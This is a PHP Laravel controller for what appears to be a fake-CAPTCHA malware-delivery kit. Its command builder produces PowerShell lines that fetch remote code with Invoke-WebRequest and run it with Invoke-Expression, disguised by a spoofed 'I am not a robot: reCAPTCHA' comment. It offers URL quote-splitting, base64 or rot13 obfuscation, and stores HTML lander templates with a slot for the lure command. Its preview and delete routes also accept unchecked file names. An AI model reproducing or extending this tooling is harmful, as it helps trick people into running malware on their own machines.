<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Inertia\Inertia;

class ToolsController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        return Inertia::render('Admin/Tools/Index');
    }

    /**
     * Display the Command Builder page.
     */
    public function commandBuilder()
    {
        return Inertia::render('Admin/Tools/CommandBuilder/Index');
    }

    /**
     * Display the Lander Templates tool.
     */
    public function landerTemplates()
    {
        // Retrieve all HTML files from the 'lander_templates' directory in storage
        $files = Storage::files('lander_templates');
        // Extract just the file names
        $templates = array_map(fn($file) => basename($file), $files);
        return Inertia::render('Admin/Tools/LanderTemplates/Index', [
            'templates' => $templates,
        ]);
    }

    /**
     * Display the Lander Builder page.
     */
    public function landerBuilder()
    {
        return Inertia::render('Admin/Tools/LanderBuilder/Index');
    }

    /**
     * Generate the obfuscated command.
     */
    public function generateCommand(Request $request)
    {
        $request->validate([
            'custom_command' => 'nullable|string',
            'file_url' => 'nullable|url',
            'obfuscation_technique' => 'nullable|in:base64,rot13',
            'obfuscate_url' => 'boolean'
        ]);

        $customCommand = $request->input('custom_command');
        $inputFileUrl = $request->input('file_url');
        $technique = $request->input('obfuscation_technique');
        $obfuscateUrl = $request->boolean('obfuscate_url');

        // Determine the file URL:
        if (!empty($inputFileUrl)) {
            // Use the file_url input if provided.
            $fileUrl = $inputFileUrl;
        } elseif ($customCommand) {
            // Otherwise, try to extract a URL from the custom command.
            preg_match_all('/https?:\/\/[^\s\'"]+/', $customCommand, $matches);
            if (!empty($matches[0])) {
                $fileUrl = $matches[0][0];
            } else {
                // If no URL is found, force file_url to be required.
                $request->validate([
                    'file_url' => 'required|url'
                ]);
            }
        } else {
            // If neither file_url nor custom command is provided, then file_url is required.
            $request->validate([
                'file_url' => 'required|url'
            ]);
        }

        // Build the base command:
        if ($customCommand) {
            // If a custom command is provided, replace the first URL found in it with $fileUrl.
            preg_match_all('/https?:\/\/[^\s\'"]+/', $customCommand, $matches);
            if (!empty($matches[0])) {
                $command = str_replace($matches[0][0], $fileUrl, $customCommand);
            } else {
                $command = $customCommand;
            }
        } else {
            // No custom command provided; use a default command template.
            $command = "POWERshelL -w 1 . Invoke-Expression ('$fileUrl'|ForEach-Object{(Invoke-WebRequest (Variable _).Value)}).Content # ''I am not a robot: rėCAΡTCHA Verification ID: 7811''";
        }

        // Obfuscate the file URL in the command if requested.
        if ($obfuscateUrl) {
            $obfuscatedUrl = $this->obfuscateUrl($fileUrl);
            // Replace all occurrences of the original file URL with the obfuscated version.
            $command = str_replace($fileUrl, $obfuscatedUrl, $command);
            $fileUrl = $obfuscatedUrl;
        }
    
        // Apply the overall obfuscation technique to the entire command if specified.
        switch ($technique) {
            case 'base64':
                $command = base64_encode($command);
                break;
            case 'rot13':
                $command = str_rot13($command);
                break;
            default:
                // No additional obfuscation.
                break;
        }

        return redirect()->route('admin.tools.commandbuilder.index')
            ->with('success', 'Command generated successfully!')
            ->with('command', $command);
    }

    /**
     * Export the generated command to a file.
     */
    public function exportCommand(Request $request)
    {
        $request->validate([
            'command' => 'required|string',
        ]);

        $command = $request->input('command');
        $filename = 'command.txt';

        return response()->streamDownload(function () use ($command) {
            echo $command;
        }, $filename, [
            'Content-Type' => 'text/plain',
        ]);
    }

    /**
     * Simulate a dry-run of the generated command.
     *
     * This method decodes the command (if needed) based on the provided technique,
     * then returns a simulated execution report without actually running the command.
     */
    public function testCommand(Request $request)
    {
        $request->validate([
            'command'   => 'required|string',
            'technique' => 'nullable|in:base64,rot13'
        ]);

        $command = $request->input('command');
        $technique = $request->input('technique');

        // Decode the command if an obfuscation technique was applied.
        if ($technique === 'base64') {
            $decodedCommand = base64_decode($command, true);
            if ($decodedCommand === false) {
                $decodedCommand = "Error: Invalid base64 encoding.";
            }
        } elseif ($technique === 'rot13') {
            $decodedCommand = str_rot13($command);
        } else {
            $decodedCommand = $command;
        }

        // Optionally simulate a short delay to mimic execution time.
        sleep(1);

        // Build a simulated dry-run execution report.
        $output = "Dry-Run Execution Report:\n";
        $output .= "----------------------------------------\n";
        $output .= "Tested Command:\n" . $command . "\n\n";
        $output .= "Decoded Command:\n" . $decodedCommand . "\n\n";
        $output .= "Status: Command appears syntactically correct.\n";
        $output .= "Simulated Execution Output:\n";
        $output .= "Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n";
        $output .= "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.\n";
        $output .= "----------------------------------------\n";
        $output .= "Note: This is a dry-run. The command was not actually executed.\n";

        return redirect()->route('admin.tools.commandbuilder.index')
            ->with('success', 'Command tested successfully!')
            ->with('test_output', $output);
    }

    /**
     * Helper function to obfuscate a URL by splitting it at random positions and rejoining with a double quote.
     *
     * @param string $url
     * @return string
     */
    private function obfuscateUrl(string $url): string
    {
        $result = '';
        $len = strlen($url);
        
        // Iterate over every character in the URL.
        for ($i = 0; $i < $len; $i++) {
            $result .= $url[$i];
            
            // Only attempt to insert a quote if this is not the last character.
            if ($i < $len - 1) {
                // 30% chance to insert a double quote after the current character.
                if (mt_rand(0, 99) < 30) {
                    // Ensure we don't insert a double quote if the last character is already a double quote.
                    if (substr($result, -1) !== '"') {
                        $result .= '"';
                    }
                }
            }
        }
        
        return $result;
    }

    public function landerTemplatesJson()
    {
        $files = Storage::files('lander_templates');
        $templates = array_map(fn($file) => basename($file), $files);
        return response()->json(['templates' => $templates]);
    }

    /**
     * Store a new lander template (HTML file) in storage.
     */
    public function storeLanderTemplate(Request $request)
    {
        $request->validate([
            'name' => 'required|string',
            'content' => 'required|string',
        ]);

        // Ensure the template content contains the required placeholder
        if (strpos($request->input('content'), '{commandPlaceholder}') === false) {
            return response()->json([
                'success' => false,
                'message' => 'Template must contain the {commandPlaceholder} placeholder.'
            ], 422);
        }

        // Ensure the storage directory exists
        if (!Storage::exists('lander_templates')) {
            Storage::makeDirectory('lander_templates');
        }

        $filename = $request->input('name') . '.html';
        Storage::put("lander_templates/{$filename}", $request->input('content'));

        return response()->json(['success' => true]);
    }

    /**
     * Preview a stored lander template.
     */
    public function previewLanderTemplate(Request $request)
    {
        $filename = $request->get('filename');
        if (!$filename || !Storage::exists("lander_templates/{$filename}")) {
            return response()->json(['content' => 'Template not found.'], 404);
        }
        $content = Storage::get("lander_templates/{$filename}");
        return response()->json(['content' => $content]);
    }

    /**
     * Delete a stored lander template.
     */
    public function deleteLanderTemplate(Request $request, $filename)
    {
        if (Storage::exists("lander_templates/{$filename}")) {
            Storage::delete("lander_templates/{$filename}");
            return response()->json(['success' => true]);
        }
        return response()->json(['success' => false], 404);
    }
}
